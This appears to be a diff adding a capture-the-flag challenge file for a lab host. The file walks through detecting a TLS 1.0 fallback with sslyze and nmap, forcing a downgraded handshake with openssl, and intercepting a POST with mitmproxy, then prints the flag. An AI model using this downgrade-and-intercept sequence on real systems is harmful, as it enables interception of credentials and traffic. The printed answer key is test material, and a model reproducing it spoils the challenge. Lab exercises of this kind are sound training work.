@@ -1,0 +1,28 @@
+Side Mission: Handshake Leak
+
+Target: secure.app.local
+Vulnerability: TLS 1.0 fallback allowed via internal reverse proxy
+
+Objective:
+Force a TLS 1.0 handshake and intercept POST request to extract flag.
+
+Steps:
+1. Confirm protocol downgrade:
+   sslyze --regular secure.app.local:443
+   or
+   nmap --script ssl-enum-ciphers -p 443 secure.app.local
+
+2. Simulate TLS 1.0 handshake:
+   openssl s_client -connect secure.app.local:443 -tls1
+
+3. Launch MITM:
+   mitmproxy --mode transparent --showhost
+
+4. Capture HTTP request:
+   POST /submit HTTP/1.1
+   Host: secure.app.local
+
+   username=admin&flag=CTF{tls_d0wngrade_br34k}
+
+Flag:
+CTF{tls_d0wngrade_br34k}
